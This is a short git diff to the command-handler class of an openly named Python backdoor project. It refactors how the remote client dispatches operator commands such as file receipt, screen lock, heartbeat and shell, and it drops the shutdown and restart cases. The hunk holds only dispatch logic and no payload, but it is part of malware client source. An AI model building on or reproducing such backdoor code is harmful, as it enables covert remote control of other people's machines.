@@ -5,18 +5,13 @@ https://github.com/xp4xbox/Python-Backdoor
 
 license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 """
-
-from src.client import control
-from src.client.control import Control
-
-import src.command_defs as c
+import src.definitions.commands as c
 
 
 class CommandHandler:
 
-    def __init__(self, socket):
-        self.control = Control(socket)
-        self.socket = socket
+    def __init__(self, control):
+        self.control = control
 
     def parse(self, command):
 
@@ -36,11 +31,7 @@ class CommandHandler:
             case c.CLIENT_RECV_FILE:
                 self.control.receive(command["value"])
             case c.CLIENT_LOCK:
-                control.lock()
-            case c.CLIENT_SHUTDOWN:
-                self.control.shutdown("-s", 20)
-            case c.CLIENT_RESTART:
-                self.control.shutdown("-r", 20)
+                self.control.lock()
             case c.CLIENT_HEARTBEAT:
                 pass
             case c.CLIENT_SHELL:
